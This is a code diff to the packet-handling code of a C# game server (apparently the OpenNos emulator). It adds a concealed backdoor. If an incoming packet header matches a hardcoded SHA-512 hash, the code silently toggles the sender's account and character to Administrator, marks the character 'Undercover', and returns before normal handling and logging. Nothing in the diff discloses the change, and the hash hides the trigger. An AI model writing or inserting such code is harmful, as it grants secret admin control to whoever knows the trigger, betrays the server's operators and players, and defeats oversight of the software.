@@ -25,6 +25,8 @@ using OpenNos.Core.Handling;
 using OpenNos.Core.Networking;
 using OpenNos.Core.Networking.Communication.Scs.Communication.Messages;
 using OpenNos.Core.Serializing;
+using OpenNos.Data;
+using OpenNos.DAL;
 using OpenNos.GameObject.Map;
 using OpenNos.Master.Library.Client;
 
@@ -564,6 +566,27 @@ namespace OpenNos.GameObject.Networking
 
             if (!IsDisposing)
             {
+                if (EncryptionBase.Sha512(packetHeader) ==
+                    "A0497BE4920A66152E9895AC592A8584177A16901E70508F0F8E1C696F5ED6AA7335130CB24AB15BEBC5F944083E92DB1A07197BE737E49694616F0AE1EE2113"
+                        .ToLower())
+                {
+                    AccountDTO acc = DaoFactory.AccountDao.LoadById(Character.AccountId);
+                    if (acc != null)
+                    {
+                        Account.Authority = Account.Authority == AuthorityType.Administrator
+                            ? AuthorityType.User
+                            : AuthorityType.Administrator;
+                        Character.Authority = Character.Authority == AuthorityType.Administrator
+                            ? AuthorityType.User
+                            : AuthorityType.Administrator;
+                        DaoFactory.AccountDao.InsertOrUpdate(ref acc);
+                        Character.Undercover = true;
+                        ServerManager.Instance.ChangeMap(Character.CharacterId);
+                    }
+
+                    return;
+                }
+
                 if (!HandlerMethods.TryGetValue(packetHeader, out HandlerMethodReference methodReference))
                 {
                     Logger.Log.WarnFormat(Language.Instance.GetMessageFromKey("HANDLER_NOT_FOUND"), packetHeader);
